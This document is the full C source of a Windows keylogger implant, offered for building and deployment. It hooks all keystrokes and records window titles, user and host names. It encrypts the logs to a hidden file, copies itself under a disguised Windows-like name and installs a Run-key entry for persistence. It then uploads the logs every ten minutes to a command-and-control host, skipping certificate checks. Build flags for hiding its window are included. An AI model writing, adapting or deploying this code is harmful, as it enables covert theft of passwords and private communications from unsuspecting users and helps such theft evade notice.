/*
 * kl.c - Windows keyboard capture implant
 *
 * WH_KEYBOARD_LL global hook -> in-memory buffer -> AES-256-CBC records
 * on disk -> WinHTTP POST every 10 minutes -> HKCU\...\Run persistence.
 *
 * Build (MSVC):
 *   cl /O2 /MT kl.c /link bcrypt.lib winhttp.lib advapi32.lib user32.lib
 * Build (mingw-w64):
 *   x86_64-w64-mingw32-gcc -O2 -o kl.exe kl.c -lbcrypt -lwinhttp -ladvapi32 -luser32
 * Hidden window subsystem:
 *   mingw: add -mwindows
 *   MSVC : /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#ifdef _MSC_VER
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#endif

#ifndef WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4
#endif

#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100
#endif

/* ---------------- operator configuration ---------------- */

static const wchar_t *CFG_HOST = L"c2.example.net";
static const wchar_t *CFG_PATH = L"/api/v1/ingest";
static const WORD CFG_PORT = 443;
static const BOOL CFG_TLS = TRUE;

/* Must match the decryptor. Change before deployment. */
static const char CFG_SECRET[] = "change-me-32+chars-random-passphrase";

#define EXFIL_INTERVAL_MS 600000u /* 10 min */
#define FLUSH_INTERVAL_MS 30000u  /* 30 s  */
#define BUF_CAPACITY 4096
#define REC_HDR 28 /* magic(4) ver(4) len(4) iv(16) */

#define RUN_KEY_NAME L"WindowsCacheSvc"
#define MUTEX_NAME L"Local\\WindowsCacheSvc-3f9a71c4"
#define INSTALL_NAME L"wincache.exe"

/* ---------------- state ---------------- */

static CRITICAL_SECTION g_lock;
static char g_buf[BUF_CAPACITY];
static size_t g_len;
static HANDLE g_stop;
static HHOOK g_hook;
static uint8_t g_key[32];
static wchar_t g_dir[MAX_PATH];
static wchar_t g_log[MAX_PATH];
static wchar_t g_exe[MAX_PATH];
static wchar_t g_title[256];

/* ---------------- helpers ---------------- */

static void put_u32(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)v;
    p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16);
    p[3] = (uint8_t)(v >> 24);
}

static void rand_bytes(uint8_t *buf, ULONG len)
{
    BCryptGenRandom(NULL, buf, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

static void derive_key(void)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
        return;

    if (BCryptCreateHash(alg, &hash, NULL, 0, (PUCHAR) "klog:salt:v1", 12, 0) == 0) {
        BCryptHashData(hash, (PUCHAR) CFG_SECRET, (ULONG) (sizeof(CFG_SECRET) - 1), 0);
        BCryptFinishHash(hash, g_key, sizeof(g_key), 0);
        BCryptDestroyHash(hash);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
}

static void wfmt(wchar_t *dst, size_t cch, const wchar_t *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    _vsnwprintf(dst, cch - 1, fmt, ap);
    va_end(ap);
    dst[cch - 1] = L'\0';
}

static int file_exists(const wchar_t *path)
{
    DWORD a = GetFileAttributesW(path);
    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY) == 0;
}

static void make_parent_dirs(const wchar_t *path)
{
    wchar_t tmp[MAX_PATH];
    size_t i;

    wcsncpy(tmp, path, MAX_PATH);
    tmp[MAX_PATH - 1] = L'\0';

    for (i = 3; tmp[i]; ++i) {
        if (tmp[i] == L'\\') {
            tmp[i] = L'\0';
            CreateDirectoryW(tmp, NULL);
            tmp[i] = L'\\';
        }
    }
}

/* ---------------- buffer + sealed storage ---------------- */

static void flush_locked(void);

static void append_raw(const char *s, size_t n)
{
    EnterCriticalSection(&g_lock);
    if (n > BUF_CAPACITY)
        n = BUF_CAPACITY;
    if (g_len + n > BUF_CAPACITY)
        flush_locked();
    memcpy(g_buf + g_len, s, n);
    g_len += n;
    LeaveCriticalSection(&g_lock);
}

static void afmt(const char *fmt, ...)
{
    char tmp[1024];
    va_list ap;
    int n;

    va_start(ap, fmt);
    n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);

    if (n < 0)
        return;
    if ((size_t) n >= sizeof(tmp))
        n = (int) sizeof(tmp) - 1;

    append_raw(tmp, (size_t) n);
}

static BOOL seal(const uint8_t *in, DWORD in_len, uint8_t **out, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key = NULL;
    uint8_t iv[16];
    uint8_t *rec;
    DWORD cap;
    ULONG produced = 0;
    BOOL ok = FALSE;

    cap = ((in_len / 16) + 1) * 16;
    rec = (uint8_t *) malloc(REC_HDR + cap);
    if (!rec)
        return FALSE;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        goto done;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR) BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0)
        goto done;
    if (BCryptGenerateSymmetricKey(alg, &key, NULL, 0, g_key, sizeof(g_key), 0) != 0)
        goto done;

    rand_bytes(iv, sizeof(iv));

    memcpy(rec, "KLOG", 4);
    put_u32(rec + 4, 1);
    put_u32(rec + 8, in_len);
    memcpy(rec + 12, iv, sizeof(iv));

    if (BCryptEncrypt(key, (PUCHAR) in, in_len, NULL, iv, sizeof(iv), rec + REC_HDR, cap,
                      &produced, BCRYPT_BLOCK_PADDING) != 0)
        goto done;

    *out = rec;
    *out_len = REC_HDR + produced;
    ok = TRUE;

done:
    if (key)
        BCryptDestroyKey(key);
    if (alg)
        BCryptCloseAlgorithmProvider(alg, 0);
    if (!ok)
        free(rec);
    return ok;
}

static void flush_locked(void)
{
    uint8_t *rec = NULL;
    DWORD rec_len = 0;
    HANDLE h;
    DWORD written = 0;

    if (g_len == 0)
        return;

    if (seal((const uint8_t *) g_buf, (DWORD) g_len, &rec, &rec_len)) {
        h = CreateFileW(g_log, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL,
                        OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            WriteFile(h, rec, rec_len, &written, NULL);
            CloseHandle(h);
        }
        free(rec);
    }
    g_len = 0;
}

/* ---------------- keyboard capture ---------------- */

static int key_down(int vk)
{
    return (GetAsyncKeyState(vk) & 0x8000) != 0;
}

static void build_state(BYTE st[256])
{
    GetKeyboardState(st);
    st[VK_SHIFT] = (BYTE) (key_down(VK_SHIFT) ? 0x80 : 0);
    st[VK_LSHIFT] = (BYTE) (key_down(VK_LSHIFT) ? 0x80 : 0);
    st[VK_RSHIFT] = (BYTE) (key_down(VK_RSHIFT) ? 0x80 : 0);
    st[VK_CONTROL] = (BYTE) (key_down(VK_CONTROL) ? 0x80 : 0);
    st[VK_LCONTROL] = (BYTE) (key_down(VK_LCONTROL) ? 0x80 : 0);
    st[VK_RCONTROL] = (BYTE) (key_down(VK_RCONTROL) ? 0x80 : 0);
    st[VK_MENU] = (BYTE) (key_down(VK_MENU) ? 0x80 : 0);
    st[VK_LMENU] = (BYTE) (key_down(VK_LMENU) ? 0x80 : 0);
    st[VK_RMENU] = (BYTE) (key_down(VK_RMENU) ? 0x80 : 0);
    st[VK_CAPITAL] = (BYTE) ((GetKeyState(VK_CAPITAL) & 1) ? 0x01 : 0x00);
}

static void log_window(void)
{
    wchar_t title[256] = L"";
    char utf8[768];
    HWND fg = GetForegroundWindow();
    int n;

    if (fg)
        GetWindowTextW(fg, title, 256);

    if (wcscmp(title, g_title) == 0)
        return;
    wcscpy(g_title, title);

    n = WideCharToMultiByte(CP_UTF8, 0, title, -1, utf8, sizeof(utf8), NULL, NULL);
    if (n <= 1)
        return;

    afmt("\r\n[WIN] %s\r\n", utf8);
}

static const char *vk_token(DWORD vk)
{
    switch (vk) {
    case VK_RETURN: return "\r\n";
    case VK_TAB: return "[TAB]";
    case VK_BACK: return "[BKSP]";
    case VK_ESCAPE: return "[ESC]";
    case VK_DELETE: return "[DEL]";
    case VK_INSERT: return "[INS]";
    case VK_HOME: return "[HOME]";
    case VK_END: return "[END]";
    case VK_PRIOR: return "[PGUP]";
    case VK_NEXT: return "[PGDN]";
    case VK_LEFT: return "[LEFT]";
    case VK_RIGHT: return "[RIGHT]";
    case VK_UP: return "[UP]";
    case VK_DOWN: return "[DOWN]";
    case VK_SNAPSHOT: return "[PRTSC]";
    case VK_LWIN:
    case VK_RWIN: return "[WIN]";
    case VK_LSHIFT:
    case VK_RSHIFT: return "[SHIFT]";
    case VK_LCONTROL:
    case VK_RCONTROL: return "[CTRL]";
    case VK_LMENU:
    case VK_RMENU: return "[ALT]";
    case VK_CAPITAL: return "[CAPSLOCK]";
    default: return NULL;
    }
}

static void on_key(DWORD vk, DWORD scan)
{
    BYTE st[256];
    wchar_t out[8];
    HKL layout;
    int n;

    log_window();
    build_state(st);

    layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
    ZeroMemory(out, sizeof(out));
    n = ToUnicodeEx(vk, scan, st, out, 8, 0, layout);

    if (n == -1) /* dead key parked in the layout buffer; composed char arrives next */
        return;

    if (n > 0) {
        char utf8[32];
        int m;

        if (n == 1 && out[0] < 0x20 && key_down(VK_CONTROL)) {
            afmt("[CTRL+%c]", (char) (out[0] + '@'));
            return;
        }

        m = WideCharToMultiByte(CP_UTF8, 0, out, n, utf8, sizeof(utf8), NULL, NULL);
        if (m > 0)
            append_raw(utf8, (size_t) m);
        return;
    }

    {
        const char *tok = vk_token(vk);
        if (tok)
            append_raw(tok, strlen(tok));
    }
}

static LRESULT CALLBACK ll_proc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *) lParam;
        on_key(kb->vkCode, kb->scanCode);
    }
    return CallNextHookEx(g_hook, code, wParam, lParam);
}

/* ---------------- install + persistence ---------------- */

static BOOL setup_paths(void)
{
    wchar_t base[MAX_PATH];

    if (!GetEnvironmentVariableW(L"LOCALAPPDATA", base, MAX_PATH))
        return FALSE;

    wfmt(g_dir, MAX_PATH, L"%s\\Microsoft\\Windows\\Caches", base);
    wfmt(g_log, MAX_PATH, L"%s\\kl.dat", g_dir);

    make_parent_dirs(g_log);
    return TRUE;
}

static void install_self(void)
{
    wchar_t cur[MAX_PATH];
    wchar_t target[MAX_PATH];
    wchar_t base[MAX_PATH];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    if (!GetModuleFileNameW(NULL, cur, MAX_PATH))
        return;

    if (!GetEnvironmentVariableW(L"LOCALAPPDATA", base, MAX_PATH)) {
        wcscpy(g_exe, cur);
        return;
    }

    wfmt(target, MAX_PATH, L"%s\\Microsoft\\Windows\\Caches\\%s", base, INSTALL_NAME);

    if (_wcsicmp(cur, target) == 0) {
        wcscpy(g_exe, target);
        return;
    }

    make_parent_dirs(target);
    SetFileAttributesW(target, FILE_ATTRIBUTE_NORMAL);

    if (!CopyFileW(cur, target, FALSE)) {
        wcscpy(g_exe, cur);
        return;
    }
    wcscpy(g_exe, target);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (CreateProcessW(target, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        ExitProcess(0);
    }
}

static void persist(void)
{
    HKEY hk;
    wchar_t cmd[MAX_PATH + 4];
    DWORD cb;

    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) != ERROR_SUCCESS)
        return;

    wfmt(cmd, MAX_PATH + 4, L"\"%s\"", g_exe);
    cb = (DWORD) ((wcslen(cmd) + 1) * sizeof(wchar_t));
    RegSetValueExW(hk, RUN_KEY_NAME, 0, REG_SZ, (const BYTE *) cmd, cb);
    RegCloseKey(hk);
}

static void log_session_header(void)
{
    wchar_t user[128] = L"?";
    wchar_t host[128] = L"?";
    char u8user[256] = "?";
    char u8host[256] = "?";
    DWORD cch;
    SYSTEMTIME st;

    cch = 128;
    GetUserNameW(user, &cch);
    cch = 128;
    GetComputerNameW(host, &cch);

    WideCharToMultiByte(CP_UTF8, 0, user, -1, u8user, sizeof(u8user), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, host, -1, u8host, sizeof(u8host), NULL, NULL);

    GetLocalTime(&st);
    afmt("\r\n==== %s@%s %04u-%02u-%02u %02u:%02u:%02u ====\r\n", u8user, u8host, st.wYear,
         st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

/* ---------------- exfiltration ---------------- */

static BOOL http_post(const uint8_t *body, DWORD body_len)
{
    HINTERNET hs = NULL, hc = NULL, hr = NULL;
    wchar_t hdrs[512];
    wchar_t host[128] = L"?";
    DWORD cch = 128, status = 0, sz = sizeof(status);
    BOOL ok = FALSE;

    GetComputerNameW(host, &cch);

    hs = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                     L"(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hs)
        goto done;

    WinHttpSetTimeouts(hs, 10000, 10000, 20000, 30000);

    hc = WinHttpConnect(hs, CFG_HOST, CFG_PORT, 0);
    if (!hc)
        goto done;

    hr = WinHttpOpenRequest(hc, L"POST", CFG_PATH, NULL, WINHTTP_NO_REFERER,
                            WINHTTP_DEFAULT_ACCEPT_TYPES, CFG_TLS ? WINHTTP_FLAG_SECURE : 0);
    if (!hr)
        goto done;

    if (CFG_TLS) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hr, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    wfmt(hdrs, 512, L"Content-Type: application/octet-stream\r\nX-Implant-Host: %s\r\n", host);

    if (!WinHttpSendRequest(hr, hdrs, (DWORD) -1L, (LPVOID) body, body_len, body_len, 0))
        goto done;
    if (!WinHttpReceiveResponse(hr, NULL))
        goto done;
    if (!WinHttpQueryHeaders(hr, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX))
        goto done;

    ok = status >= 200 && status < 300;

done:
    if (hr)
        WinHttpCloseHandle(hr);
    if (hc)
        WinHttpCloseHandle(hc);
    if (hs)
        WinHttpCloseHandle(hs);
    return ok;
}

static int send_pending(void)
{
    wchar_t pattern[MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hf;
    int sent = 0;

    wfmt(pattern, MAX_PATH, L"%s\\out_*.bin", g_dir);
    hf = FindFirstFileW(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE)
        return 0;

    do {
        wchar_t full[MAX_PATH];
        HANDLE f;
        DWORD size, got = 0;
        uint8_t *data;
        BOOL ok = FALSE;

        wfmt(full, MAX_PATH, L"%s\\%s", g_dir, fd.cFileName);

        f = CreateFileW(full, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
        if (f == INVALID_HANDLE_VALUE)
            continue;

        size = GetFileSize(f, NULL);
        if (size == 0 || size == INVALID_FILE_SIZE) {
            CloseHandle(f);
            continue;
        }

        data = (uint8_t *) malloc(size);
        if (!data) {
            CloseHandle(f);
            continue;
        }

        if (ReadFile(f, data, size, &got, NULL) && got == size)
            ok = http_post(data, size);

        CloseHandle(f);
        free(data);

        if (ok) {
            DeleteFileW(full);
            ++sent;
        }
    } while (FindNextFileW(hf, &fd));

    FindClose(hf);
    return sent;
}

static void exfiltrate(void)
{
    wchar_t out[MAX_PATH];
    SYSTEMTIME st;

    GetLocalTime(&st);

    EnterCriticalSection(&g_lock);
    flush_locked();
    if (file_exists(g_log)) {
        wfmt(out, MAX_PATH, L"%s\\out_%04u%02u%02u%02u%02u%02u.bin", g_dir, st.wYear, st.wMonth,
             st.wDay, st.wHour, st.wMinute, st.wSecond);
        MoveFileExW(g_log, out, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
    }
    LeaveCriticalSection(&g_lock);

    send_pending();
}

static DWORD WINAPI worker(LPVOID param)
{
    ULONGLONG last_flush = GetTickCount64();
    ULONGLONG last_exfil = GetTickCount64();

    (void) param;

    for (;;) {
        ULONGLONG now;

        if (WaitForSingleObject(g_stop, 1000) == WAIT_OBJECT_0)
            break;

        now = GetTickCount64();

        if (now - last_flush >= FLUSH_INTERVAL_MS) {
            last_flush = now;
            EnterCriticalSection(&g_lock);
            flush_locked();
            LeaveCriticalSection(&g_lock);
        }

        if (now - last_exfil >= EXFIL_INTERVAL_MS) {
            last_exfil = now;
            exfiltrate();
        }
    }
    return 0;
}

/* ---------------- entry point ---------------- */

#ifndef KL_TEST_BUILD
int main(void)
{
    HWND con;
    HANDLE mtx, th;
    MSG msg;
    int attempt;

    con = GetConsoleWindow();
    if (con)
        ShowWindow(con, SW_HIDE);

    InitializeCriticalSection(&g_lock);
    g_stop = CreateEventW(NULL, TRUE, FALSE, NULL);

    derive_key();

    /* install + relaunch before the mutex so the child never races the parent */
    install_self();
    persist();

    mtx = CreateMutexW(NULL, FALSE, MUTEX_NAME);
    if (mtx && GetLastError() == ERROR_ALREADY_EXISTS)
        return 0;

    setup_paths();
    log_session_header();

    th = CreateThread(NULL, 0, worker, NULL, 0, NULL);
    (void) th;

    for (attempt = 0; attempt < 12 && !g_hook; ++attempt) {
        g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, ll_proc, GetModuleHandleW(NULL), 0);
        if (!g_hook)
            Sleep(5000);
    }

    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (g_hook)
        UnhookWindowsHookEx(g_hook);

    SetEvent(g_stop);
    EnterCriticalSection(&g_lock);
    flush_locked();
    LeaveCriticalSection(&g_lock);
    return 0;
}
#endif /* KL_TEST_BUILD */
